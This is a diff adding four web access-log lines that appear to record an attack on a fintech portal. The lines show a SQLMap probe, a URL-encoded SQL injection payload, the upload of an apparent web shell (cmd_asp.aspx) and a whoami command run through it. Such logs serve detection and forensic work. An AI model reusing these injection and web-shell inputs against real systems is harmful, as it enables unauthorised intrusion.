@@ -1,0 +1,4 @@
+198.51.100.24 - - [18/Sep/2026:08:30:12 +0000] "GET /api/v1/auth/status HTTP/1.1" 200 452 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLMap/1.6"
+198.51.100.24 - - [18/Sep/2026:08:31:05 +0000] "POST /api/v1/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 1204 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLMap/1.6"
+198.51.100.24 - - [18/Sep/2026:08:42:20 +0000] "POST /uploads/2026/09/cmd_asp.aspx HTTP/1.1" 201 540 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+198.51.100.24 - - [18/Sep/2026:08:43:00 +0000] "GET /uploads/2026/09/cmd_asp.aspx?cmd=whoami HTTP/1.1" 200 82 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
